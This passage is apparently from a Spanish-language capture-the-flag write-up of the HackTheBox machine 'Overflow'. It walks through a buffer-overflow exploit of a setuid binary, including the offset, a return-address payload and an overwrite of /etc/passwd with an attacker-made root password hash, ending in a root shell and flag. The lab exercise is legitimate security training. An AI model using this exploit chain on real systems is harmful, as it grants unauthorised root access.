./file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
zsh: segmentation fault  ./file_encrypt
```

Con ```gdb``` creo un patrón para encontrar el ```offset```

```null
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
[+] Saved as '$_gef0'
```

Ejecuto pasándoselo como input

```null
gef➤  r
Starting program: /home/rubbx/Desktop/HTB/Machines/Overflow/file_encrypt 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
This is the code 1804289383. Enter the Pin: -202976456
name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
```

Y obtengo el valor

```null
gef➤  pattern offset $eip
[+] Searching for '$eip'
[+] Found at offset 44 (little-endian search) likely
[+] Found at offset 41 (big-endian search)
```

Está empleando protecciones por lo que no es tan sencillo inyectar un comando

```null
gef➤  checksec
[+] checksec for '/home/rubbx/Desktop/HTB/Machines/Overflow/file_encrypt'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

Desde ```Ghidra``` puedo ver una función ```encrypt``` que no se está empleando

<img src="/writeups/assets/img/Overflow-htb/28.png" alt="">

Apunto a la dirección de esta función

```null
gef➤  disass encrypt
Dump of assembler code for function encrypt:
   0x5655585b <+0>:	push   ebp
...
```

Genero el payload e introduzco en la máquina víctima

```null
python3 -c 'print("A"*44 + "\x5b\x58\x55\x56")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
```

```null
tester@overflow:/opt/file_encrypt$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Enter Input File: 
```

Copio el ```/etc/passwd``` para hardcodear una contraseña en formato ```Text Unix```. Como en el cifrado se está aplicando un ```XOR```, al hacer dos veces esta operatoria, el resultado es el mismo por lo que podría sobrescribirlo en text plano

<img src="/writeups/assets/img/Overflow-htb/29.png" alt="">

```null
tester@overflow:/tmp$ cp /etc/passwd passwd
```

```null
openssl passwd
Password: 
Verifying - Password: 
$1$k0rxc4sJ$rZl/CNHTxSQD3MeHip84D0
```

```null
tester@overflow:/tmp$ cat passwd | head -n 1
root:$1$k0rxc4sJ$rZl/CNHTxSQD3MeHip84D0:0:0:root:/root:/bin/bash
```

Ejecuto el ```file_encrypt``` para crear una copia encodeada

```null
tester@overflow:/tmp$ /opt/file_encrypt/file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Enter Input File: passwd
Enter Encrypted File: passwd.enc
```

Ahora ```passwd.enc``` tiene como propietario ```root```, para evitar problemas, lo tengo que volver a copiar

```null
tester@overflow:/tmp$ /opt/file_encrypt/file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Enter Input File: passwd.enc
Enter Encrypted File: /etc/passwd
File passwd.enc is owned by root
```

```null
tester@overflow:/tmp$ cp passwd.enc passwd.encrypt
```

De esta manera se modifica correctamente

```null
tester@overflow:/tmp$ /opt/file_encrypt/file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Enter Input File: passwd.encrypt
Enter Encrypted File: /etc/passwd
```

```null
tester@overflow:/tmp$ cat /etc/passwd | head -n 1
root:$1$k0rxc4sJ$rZl/CNHTxSQD3MeHip84D0:0:0:root:/root:/bin/bash
```

Puedo ver la segunda flag

```null
tester@overflow:/tmp$ su root
Password: 
root@overflow:/tmp# cat /root/root.txt 
8788da482444389962bea5408568557d
```